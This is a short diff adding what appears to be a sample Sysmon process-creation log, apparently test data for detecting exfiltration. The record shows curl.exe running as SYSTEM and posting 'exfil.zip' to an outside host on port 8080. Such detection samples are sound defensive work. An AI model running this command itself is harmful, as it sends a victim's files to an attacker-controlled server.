@@ -1,0 +1,25 @@
+Field:	Value
+CommandLine:	curl -d @exfil.zip http://huntmeplz.com:8080/
+Company:	curl, https://curl.haxx.se/
+CurrentDirectory:	C:\Users\victim\Documents\
+Description:	The curl executable
+EventID:	1
+FileVersion:	7.55.1
+Hashes:	MD5=2419907A0BB9A14F1871F0BDA7F65578,SHA256=C53B0901C262071DA3F3FBB69C30C2C26E2AB7866C7C42183C830B9A609C7994,IMPHASH=93009B50C3F15A001009BCDE9939BF92
+Image:	C:\Windows\System32\curl.exe
+IntegrityLevel:	System
+LogonGuid:	{4bbef3ae-819b-630c-e703-000000000000}
+LogonId:	0x3e7
+OriginalFileName:	curl.exe
+ParentCommandLine:	cmd.exe
+ParentImage:	C:\Windows\System32\cmd.exe
+ParentProcessGuid:	{4bbef3ae-cc6b-630c-1e10-000000000e00}
+ParentProcessId:	6420
+ParentUser:	NT AUTHORITY\SYSTEM
+ProcessGuid:	{4bbef3ae-cc83-630c-2010-000000000e00}
+ProcessId:	10928
+Product:	The curl executable
+RuleName:	-
+TerminalSessionId:	0
+User:	NT AUTHORITY\SYSTEM
+UtcTime:	2022-08-2
